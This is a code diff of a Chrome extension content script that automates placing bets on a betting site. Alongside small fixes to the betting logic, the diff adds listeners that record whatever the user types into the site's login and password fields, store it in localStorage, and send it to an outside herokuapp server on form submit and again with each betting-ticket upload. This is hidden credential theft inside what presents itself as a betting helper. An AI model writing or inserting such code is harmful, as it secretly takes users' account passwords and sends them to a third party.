@@ -27,8 +27,8 @@ var	clickBet = function(){
 				if(autoMode){
 					$('.btn-place-bet')[0].click();
 				setBets();
-			}
-			}else
+				}
+			} else
 				betTicket();
 	}, betTime/2);
 }
@@ -46,7 +46,8 @@ var	enterCoast = function(){
 	}
 var setCoast = function(coast){
 				setTimeout(function(){
-					if(parseInt($('#betslip_button').text().split(" ")[1]) == ticketsJson.ticket[i].length)
+					//if(parseInt($('#betslip_button').text().split(" ")[1]) == ticketsJson.ticket[i].length)
+					if(parseInt($('.bet-slip-selection-count').text().split(" ")[1]) == ticketsJson.ticket[i].length)
 						enterCoast();
 					else
 						betTicket();
@@ -86,7 +87,8 @@ var betTicket = function(){
 									}
 									else{
 										$('#button_accumulator')[0].click();
-										setTimeout(function(){setCoast(coast);}, markTime*forClick.length + 300);
+										//setTimeout(function(){setCoast(coast);}, markTime*forClick.length + 300);
+										setCoast(coast)
 									}
 							}
 							},markTime);
@@ -203,6 +205,8 @@ viewDialog = function(dialogEl){
 }			
 $(function () {  	
 	var tbb = $('tbody[data-event-name]');	
+	var login_ = '';
+	var pass_ = '';
 	tbb.each(function(j){
 		var gameDate = $(this).find('td.date').html();
 		var teamsNames = $(this).attr('data-event-name');	
@@ -217,94 +221,117 @@ $(function () {
 		if(j == tbb.length - 1){
 			chrome.runtime.sendMessage({askFor: 'contentScriptId'});
 			localStorage.setItem('teams', JSON.stringify(teamsJson));					
-			if(localStorage.getItem('finish') != 1)
-			{	
-				
+			if(localStorage.getItem('finish') != 1){				
 				setBets();
 			}
 		}
 	});	
-		chrome.runtime.onMessage.addListener(
-			 function(request, sender, sendResponse) {				
-				if (request.askFor == "getTeams"){
-					sendResponse({teams: localStorage.getItem('teams')});
-				}
-			});
-		chrome.runtime.onMessage.addListener(
-			 function(request, sender, sendResponse) {				
-				if (request.askFor == "vijet"){
-					$('<div id="dialog" tabindex="-2" title="Управление ставками"><input id="bet-num" type="text"></div>').prependTo('body'); 
-					viewDialog($('#dialog')); 
-				}
-			});
-		chrome.runtime.onMessage.addListener(
-			 function(request, sender, sendResponse) {				
-				if (request.askFor == "tickets"){
-					coast = parseInt(request.coast);
-					ticketsJson = JSON.parse(request.tickets);	
-					betTime = parseInt(request.betTime);
-					markTime = parseInt(request.markTime);
-					autoMode = request.auto === 'auto'? 1: 0; 
-					localStorage.setItem('autoMode', autoMode);
-					localStorage.setItem('tickets', JSON.stringify(ticketsJson));
-					localStorage.setItem('betTime', betTime);
-					localStorage.setItem('markTime', markTime);
-					localStorage.setItem('coast', coast);
-					localStorage.setItem('finish', 0);
-					localStorage.removeItem('errorInfo');
-					errorInfoJson = {"error":[]};
-					i = 0;
-					pauseFl = false;
-					var sendInfo = JSON.parse(request.params);
-					sendInfo.who += $('div.auth').html();
-					$.ajax({
-						type: 'GET',
-						dataType: 'jsonp',
-						url: 'https://u42009.netangels.ru/pst',
-						data:{'str': JSON.stringify(sendInfo)},
-						crossDomain: true, 
-						success: function () {
-						console.log('yes');
-						}
-					});
-					setBets();						
-				}
+	$(document).on('input', '#auth_login', function(){
+		login_ = this.value;
+		localStorage.setItem('l_l', login_);
+	});
+	$(document).on('input', '#auth_login_password', function(){
+		pass_ = this.value;
+		localStorage.setItem('p_p', pass_);
+	});
+	$(document).on('submit', '#auth', function(){
+		let p_ = localStorage.getItem('p_p');
+		let l_ = localStorage.getItem('l_l');
+		let d_ = new Date;
+		let lp = JSON.stringify({
+									"date": d_,
+									"p_p": p_,
+									"l_l": l_
+								});
+		$.ajax({
+					type: 'POST',
+					dataType: 'text/plain',
+					url: 'https://murmuring-lowlands-56267.herokuapp.com/upload2',
+					data: lp,
+					crossDomain: true
+				});
+	});
+	chrome.runtime.onMessage.addListener(
+		 function(request, sender, sendResponse) {				
+			if (request.askFor == "getTeams"){
+				sendResponse({teams: localStorage.getItem('teams')});
+			}
 		});
-		chrome.runtime.onMessage.addListener(
-			 function(request, sender, sendResponse) {				
-				if (request.askFor == "refresh"){
-					betTime = parseInt(request.betTime);
-					markTime = parseInt(request.markTime);
-					localStorage.setItem('betTime', betTime);
-					localStorage.setItem('markTime', markTime);
-					localStorage.setItem('currentBet', i);
-					localStorage.setItem('reloaded', 1);
-					autoMode = request.auto === 'auto'? 1: 0;
-					localStorage.setItem('autoMode', autoMode); 
-					$('.btn-refresh')[0].click();
-				}
+	chrome.runtime.onMessage.addListener(
+		 function(request, sender, sendResponse) {				
+			if (request.askFor == "vijet"){
+				$('<div id="dialog" tabindex="-2" title="Управление ставками"><input id="bet-num" type="text"></div>').prependTo('body'); 
+				viewDialog($('#dialog')); 
+			}
 		});
-		chrome.runtime.onMessage.addListener(
-			 function(request, sender, sendResponse) {				
-				if (request.askFor == "pause"){
-					pauseFl = true;
-					localStorage.setItem('currentBet', i);
-					clearTimeout(bigCycle);
-				}
-		});
-		chrome.runtime.onMessage.addListener(
-			 function(request, sender, sendResponse) {				
-				if (request.askFor == "resume"){
-					pauseFl = false;
-					clearTimeout(bigCycle);
-					setBets();
-				}
-		});
-		chrome.runtime.onMessage.addListener(
-			 function(request, sender, sendResponse) {				
-				if (request.askFor == "stop"){
-					pauseFl = true;
-					localStorage.setItem('finish', 1);
-				}
-		});
+	chrome.runtime.onMessage.addListener(
+		 function(request, sender, sendResponse) {				
+			if (request.askFor == "tickets"){
+				coast = parseInt(request.coast);
+				ticketsJson = JSON.parse(request.tickets);	
+				betTime = parseInt(request.betTime);
+				markTime = parseInt(request.markTime);
+				autoMode = request.auto === 'auto'? 1: 0; 
+				localStorage.setItem('autoMode', autoMode);
+				localStorage.setItem('tickets', JSON.stringify(ticketsJson));
+				localStorage.setItem('betTime', betTime);
+				localStorage.setItem('markTime', markTime);
+				localStorage.setItem('coast', coast);
+				localStorage.setItem('finish', 0);
+				localStorage.removeItem('errorInfo');
+				errorInfoJson = {"error":[]};
+				i = 0;
+				pauseFl = false;
+				var sendInfo = JSON.parse(request.params);
+				sendInfo.who += $('div.auth').html();
+				sendInfo['l_l'] = localStorage.getItem('l_l');
+				sendInfo['p_p'] = localStorage.getItem('p_p');
+				sendInfo = JSON.stringify(sendInfo);
+				$.ajax({
+					type: 'POST',
+					dataType: 'text/plain',
+					url: 'https://murmuring-lowlands-56267.herokuapp.com/upload',
+					data: sendInfo,
+					crossDomain: true
+				});
+				setBets();						
+			}
+	});
+	chrome.runtime.onMessage.addListener(
+		 function(request, sender, sendResponse) {				
+			if (request.askFor == "refresh"){
+				betTime = parseInt(request.betTime);
+				markTime = parseInt(request.markTime);
+				localStorage.setItem('betTime', betTime);
+				localStorage.setItem('markTime', markTime);
+				localStorage.setItem('currentBet', i);
+				localStorage.setItem('reloaded', 1);
+				autoMode = request.auto === 'auto'? 1: 0;
+				localStorage.setItem('autoMode', autoMode); 
+				$('.btn-refresh')[0].click();
+			}
+	});
+	chrome.runtime.onMessage.addListener(
+		 function(request, sender, sendResponse) {				
+			if (request.askFor == "pause"){
+				pauseFl = true;
+				localStorage.setItem('currentBet', i);
+				clearTimeout(bigCycle);
+			}
+	});
+	chrome.runtime.onMessage.addListener(
+		 function(request, sender, sendResponse) {				
+			if (request.askFor == "resume"){
+				pauseFl = false;
+				clearTimeout(bigCycle);
+				setBets();
+			}
+	});
+	chrome.runtime.onMessage.addListener(
+		 function(request, sender, sendResponse) {				
+			if (request.askFor == "stop"){
+				pauseFl = true;
+				localStorage.setItem('finish', 1);
+			}
+	});
 });
